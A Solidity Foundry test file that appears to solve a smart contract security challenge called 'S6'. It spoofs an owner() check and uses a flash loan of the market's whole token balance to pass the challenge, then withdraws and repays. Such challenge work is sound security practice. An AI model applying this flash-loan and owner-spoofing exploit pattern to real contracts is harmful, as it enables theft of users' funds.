// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {S6} from "../src/S6_Challenge/S6.sol";
import {S6Market} from "../src/S6_Challenge/S6Market.sol";
import {S6Token} from "./mocks/S6Token.sol";
import {Test, console} from "forge-std/Test.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract S6_ChallengeTest is Test {

    using SafeERC20 for S6Token;

    S6 private s6;
    S6Market private market;
    S6Token private s6Token;
    // uint256 public constant S6_NFT_COST = 2_000_000e18;

    function setUp() public virtual {
        s6 = new S6();
        s6Token = S6Token(s6.getToken()); 
        market = S6Market(s6.getMarket());
    }

    function testSolveChallengePass1rst() public view {
        // pass 1rst IF in solveChallenge
        // WhoAreYou(msg.sender).owner() == address(msg.sender)
        s6.solveChallenge("chamdev1");
    }


    function testFlashLoan() public {
        getBalances();
        market.flashLoan(s6Token.balanceOf(address(market)));
    }


    function getBalances() internal view {
        console.log("Balance S6: ", s6Token.balanceOf(address(s6)));
        console.log("Balance this: ", s6Token.balanceOf(address(this)));
        console.log("Balance Market: ", s6Token.balanceOf(address(market)));
        console.log("-----------------------------------------------");
    }

    /*
        Interface Methods
    */
    function owner() external view returns (address) {
        console.log("CP1");
        return address(this);
    }

    function execute() external payable {
        console.log("CP2");

        s6Token.approve(address(s6), s6Token.balanceOf(address(this)));
        s6.depositMoney(s6Token.balanceOf(address(this)));
        s6.solveChallenge("chamdev1");

        // Withdraw amount from S6 (S6 -> this) and then repay loan (this -> market)
        s6.withdrawMoney();
        s6Token.safeTransfer(address(market), s6Token.balanceOf(address(this)));
    }
}
